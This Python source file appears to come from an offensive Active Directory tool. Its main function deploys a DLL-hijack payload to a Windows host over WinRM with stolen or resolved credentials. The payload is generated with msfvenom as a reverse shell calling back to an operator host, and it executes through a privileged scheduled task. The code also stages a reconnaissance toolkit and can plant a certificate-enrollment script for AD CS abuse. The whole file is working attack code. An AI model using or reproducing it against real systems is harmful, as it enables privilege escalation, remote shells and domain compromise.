from __future__ import annotations

import json
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path
from typing import TYPE_CHECKING, Any

from admapper.models.workspace import OperationMode
from admapper.postex.creds import WinRMCred, resolve_winrm_cred
from admapper.postex.monitor_log import resolve_hijack_payload_names, resolve_monitor_log_path
from admapper.postex.task_run_as import resolve_task_run_as
from admapper.postex.payload import PayloadGenerator, PayloadMode, prepare_hijack_payload
from admapper.postex.pe_arch import (
    TargetArch,
    resolve_payload_arch,
)
from admapper.support.connectivity import (
    TargetUnreachableError,
    format_unreachable_message,
    require_target_reachable,
)
from admapper.support.output import ConfirmLevel, confirm, print_info, print_success, print_warning
from admapper.winrm.client import WinRMClient, WinRMError
from admapper.winrm.factory import winrm_client_for_cred
from admapper.winrm.upload import remote_file_ok, upload_file

if TYPE_CHECKING:
    from admapper.support.session import Session


@dataclass
class DeployResult:
    op_id: str | None
    remote_path: str
    local_zip: str
    shell_user: str
    run_as_user: str
    task_name: str
    callback_ip: str = ""
    callback_port: int = 0
    enroll_deploy_marker: str = ""
    target_arch: str = "x64"
    errors: list[str] = field(default_factory=list)


def _load_json(path: Path) -> dict[str, Any] | None:
    if not path.is_file():
        return None
    return json.loads(path.read_text(encoding="utf-8"))


def _finding_from_scan(scan_data: dict[str, Any]) -> dict[str, Any] | None:
    findings = scan_data.get("findings") or []
    return findings[0] if findings else None


def _find_postex_op(ws_path: Path, op_id: str) -> dict[str, Any] | None:
    ops = _load_json(ws_path / "postex_ops.json") or {}
    for item in ops.get("opportunities") or []:
        if str(item.get("id")) == op_id:
            return item
    return None


def resolve_hijack_op(
    session: Session,
    *,
    op_id: str | None = None,
    technique: str = "dll_hijack_scheduled_task",
) -> dict[str, Any]:
    ws_path = session.workspaces.path_for(session.workspace.name)  # type: ignore[union-attr]
    scan = _load_json(ws_path / "postex_scan.json") or {}
    finding = _finding_from_scan(scan)

    from admapper.postex.analyze import resolve_hijack_op_id

    if op_id:
        item = _find_postex_op(ws_path, op_id)
        if item is None:
            raise ValueError(f"opportunity not found: {op_id} — run: admapper postex -w <workspace>")
        if item.get("technique") != technique:
            hijack_id = resolve_hijack_op_id(session)
            if hijack_id and hijack_id != op_id:
                print_info(
                    f"op {op_id} is now {item.get('technique')} — postex ids shifted after "
                    f"re-analysis; using {hijack_id} ({technique})"
                )
                op_id = hijack_id
                item = _find_postex_op(ws_path, op_id)
            else:
                print_warning(
                    f"op {op_id} technique is {item.get('technique')}, not {technique}"
                )
        if item is None:
            raise ValueError(f"hijack opportunity not found — run: admapper postex scan -w <workspace>")
        merged = dict(item)
        merged["finding"] = finding
        return merged

    hijack_id = resolve_hijack_op_id(session)
    if hijack_id:
        item = _find_postex_op(ws_path, hijack_id)
        if item:
            merged = dict(item)
            merged["finding"] = finding
            return merged

    if finding:
        return {
            "id": None,
            "technique": technique,
            "target_host": scan.get("dc_ip"),
            "context": scan.get("shell_user"),
            "finding": finding,
        }
    raise ValueError("no hijack finding — run: admapper postex scan -w <workspace>")


def _winrm_client(cred: WinRMCred, session: Session) -> WinRMClient:
    return winrm_client_for_cred(cred, session)


def _resolve_target_arch(
    finding: dict,
    scan: dict,
    *,
    client: WinRMClient | None = None,
    arch_override: TargetArch | None = None,
    ws_path: Path | None = None,
) -> TargetArch:
    arch, _reason = resolve_payload_arch(
        finding,
        scan,
        client=client,
        arch_override=arch_override,
        ws_path=ws_path,
    )
    return arch


def deploy_dll_hijack(
    session: Session,
    *,
    op_id: str | None = None,
    cred_id: str | None = None,
    lhost: str | None = None,
    lport: int = 4444,
    payload_dll: Path | None = None,
    dry_run: bool = False,
    exclude_ips: set[str] | None = None,
    arch: TargetArch | None = None,
    payload_mode: PayloadMode = "shell",
    enroll_template: str = "",
    enroll_dns: str = "",
    enroll_ca_name: str = "",
    enroll_ca_host: str = "",
    generator: PayloadGenerator = "msfvenom",
) -> DeployResult:
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    op = resolve_hijack_op(session, op_id=op_id)
    ws_path = session.workspaces.path_for(session.workspace.name)
    scan = _load_json(ws_path / "postex_scan.json") or {}
    finding = op.get("finding") or _finding_from_scan(scan) or {}

    drop_path = str(finding.get("drop_path") or r"C:\ProgramData")
    zip_name, dll_name = resolve_hijack_payload_names(finding, scan)
    task_name = str(finding.get("task_name") or "scheduled task")
    run_as = resolve_task_run_as(scan, finding, ws_path=ws_path)
    shell_user = str(scan.get("shell_user") or op.get("context") or "")
    target_host = str(scan.get("dc_ip") or op.get("target_host") or "")

    if not dry_run and session.workspace.mode == OperationMode.AUTO:
        try:
            require_target_reachable(session, host=target_host or None)
        except TargetUnreachableError as exc:
            raise RuntimeError(format_unreachable_message(exc)) from exc

    cred = resolve_winrm_cred(
        session,
        shell_user=shell_user or None,
        cred_id=cred_id,
        host=target_host or None,
    )
    remote_path = f"{drop_path.rstrip('\\')}\\{zip_name}"
    remote_path_fwd = remote_path.replace("\\", "/")
    client = _winrm_client(cred, session)
    target_arch, arch_reason = resolve_payload_arch(
        finding,
        scan,
        client=client,
        arch_override=arch,
        ws_path=ws_path,
    )
    print_info(f"arch: {target_arch} ({arch_reason})")

    monitor_for_export = str(scan.get("monitor_log_excerpt") or "")
    log_path = resolve_monitor_log_path(scan, drop_path)
    if log_path:
        try:
            safe_log = log_path.replace("'", "''")
            proc = client.execute(
                f"Get-Content -LiteralPath '{safe_log}' -Tail 50",
                shell="powershell",
            )
            live = (proc.stdout or "").strip()
            if live:
                monitor_for_export = live
        except WinRMError:
            pass

    mode = session.mode
    safe_zip = zip_name if session.mode == OperationMode.MANUAL else "payload.zip"
    safe_run_as = run_as if session.mode == OperationMode.MANUAL else "detected"
    msg = (
        f"deploy {safe_zip} → {remote_path} via WinRM as {cred.domain}\\{cred.username} "
        f"(task {task_name} → {run_as})"
    )
    if not confirm(
        msg,
        level=ConfirmLevel.WARN,
        mode_auto=mode == OperationMode.AUTO,
        mode_manual=mode == OperationMode.MANUAL,
    ):
        raise RuntimeError("deploy cancelled")

    enroll_profile = None
    if payload_mode == "enroll":
        from admapper.adcs.enroll import load_enroll_profile, validate_enroll_principal

        enroll_profile = load_enroll_profile(
            session,
            template=enroll_template,
            dns_name=enroll_dns,
            ca_host=enroll_ca_host,
            ca_name=enroll_ca_name,
            run_as_user=run_as,
        )
        for warning in validate_enroll_principal(
            cred.username, machine_template=enroll_profile.machine_context
        ):
            print_warning(warning)
        print_info(
            f"enroll will execute as task user {run_as} when the task runs — "
            f"do not run the enrollment script manually over WinRM as {cred.username}"
        )

    build = prepare_hijack_payload(
        workspace_dir=ws_path,
        dll_name=dll_name,
        zip_name=zip_name,
        lhost=lhost,
        lport=lport,
        payload_dll=payload_dll,
        drop_path=drop_path,
        exclude_ips=exclude_ips,
        arch=target_arch,
        payload_mode=payload_mode,
        enroll_template=enroll_template,
        enroll_dns=enroll_dns,
        enroll_ca_name=enroll_ca_name,
        enroll_ca_host=enroll_ca_host,
        enroll_run_as_user=run_as,
        enroll_profile=enroll_profile,
        generator=generator,
        monitor_log=monitor_for_export,
    )

    print_info(f"local payload: {build.zip_path} ({build.generator})")
    print_info(f"remote target: {remote_path}")
    fetch_host = (build.lhost or lhost or "").strip() or None

    if dry_run:
        print_info("dry-run — skipping upload")
        return DeployResult(
            op_id=op.get("id"),
            remote_path=remote_path,
            local_zip=str(build.zip_path),
            shell_user=cred.username,
            run_as_user=run_as,
            task_name=task_name,
            target_arch=target_arch,
        )

    enroll_marker = ""
    try:
        from admapper.escalate.analyze import record_escalation_step

        record_escalation_step(
            session,
            action="dll_hijack_deploy",
            detail=f"upload {zip_name} via {cred.domain}\\{cred.username} → {remote_path}",
        )
        if payload_mode == "enroll":
            from admapper.adcs.enroll import build_local_enroll_powershell

            enroll_marker = (
                f"=== admapper deploy {datetime.now(UTC).isoformat()} expect={run_as} ==="
            )
            ps = build_local_enroll_powershell(
                template=enroll_template,
                dns_name=enroll_dns,
                ca_host=enroll_ca_host,
                ca_name=enroll_ca_name,
                profile=enroll_profile,
                run_as_user=run_as,
                drop_path=drop_path,
            )
            enroll_remote = f"{drop_path.rstrip('\\')}\\{op.get('id', 'enroll')}.ps1"
            enroll_local = ws_path / "certs" / f"{op.get('id', 'enroll')}.ps1"
            enroll_local.parent.mkdir(parents=True, exist_ok=True)
            enroll_local.write_text(ps + "\n", encoding="utf-8")
            upload_file(client, enroll_local, enroll_remote, http_fetch_host=fetch_host)
            print_success(f"uploaded enrollment script → {enroll_remote}")
            log_remote = f"{drop_path.rstrip('\\')}\\{op.get('id', 'enroll')}.log"
            safe_marker = enroll_marker.replace("'", "''")
            safe_log = log_remote.replace("'", "''")
            client.execute(
                f"Set-Content -LiteralPath '{safe_log}' -Value '{safe_marker}'",
                shell="powershell",
            )

        upload_method = upload_file(
            client, build.zip_path, remote_path_fwd, http_fetch_host=fetch_host
        )
        # HTTP staging is already confirmed by the remote shell fetching via curl/IWR;
        # a follow-up WinRM verification often fails due to execution policy, so skip it.
        if upload_method != "http" and not remote_file_ok(
            client, remote_path_fwd, expected_size=build.zip_path.stat().st_size
        ):
            raise RuntimeError(
                "upload not verified on target — use interactive evil-winrm: "
                f"upload {build.zip_path.resolve()} {remote_path}"
            )
        print_success(f"uploaded → {remote_path}")
        from admapper.postex.monitor_log import grant_task_read_acl
        from admapper.sharphound.toolkit import REMOTE_TOOLKIT_BASE, stage_toolkit_winrm

        grant_task_read_acl(
            client,
            remote_path_fwd,
            domain=cred.domain,
            run_as_user=run_as,
        )
        toolkit_files: list[str] = []
        if payload_mode == "shell" and fetch_host:
            try:
                toolkit_files = stage_toolkit_winrm(
                    client,
                    domain=cred.domain,
                    upload_user=cred.username,
                    execute_as=run_as,
                    http_fetch_host=fetch_host,
                )
            except Exception as exc:  # noqa: BLE001
                print_warning(f"toolkit staging failed (collect may re-stage): {exc}")
    except WinRMError as exc:
        from admapper.postex.monitor_log import print_postex_diagnostics

        print_warning("upload failed — fetching remote log and payload status …")
        try:
            print_postex_diagnostics(session, host=target_host or None, cred_id=cred_id)
        except Exception as diag_exc:
            print_warning(f"diagnostics: {diag_exc}")
        raise RuntimeError(str(exc)) from exc

    log = {
        "timestamp": datetime.now(UTC).isoformat(),
        "technique": "dll_hijack_scheduled_task",
        "op_id": op.get("id"),
        "remote_path": remote_path,
        "local_zip": str(build.zip_path),
        "callback_ip": build.lhost or lhost or "",
        "callback_port": build.lport or lport,
        "shell_user": cred.username,
        "run_as_user": run_as,
        "task_name": task_name,
        "enroll_deploy_marker": enroll_marker,
        "toolkit_base": (REMOTE_TOOLKIT_BASE if toolkit_files else ""),
        "toolkit_upload_user": (cred.username if toolkit_files else ""),
        "toolkit_execute_as": (run_as if toolkit_files else ""),
        "toolkit_files": toolkit_files,
    }
    (ws_path / "postex_deploy.json").write_text(
        json.dumps(log, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )

    return DeployResult(
        op_id=op.get("id"),
        remote_path=remote_path,
        local_zip=str(build.zip_path),
        shell_user=cred.username,
        run_as_user=run_as,
        task_name=task_name,
        callback_ip=build.lhost or lhost or "",
        callback_port=build.lport or lport,
        enroll_deploy_marker=enroll_marker,
        target_arch=target_arch,
    )
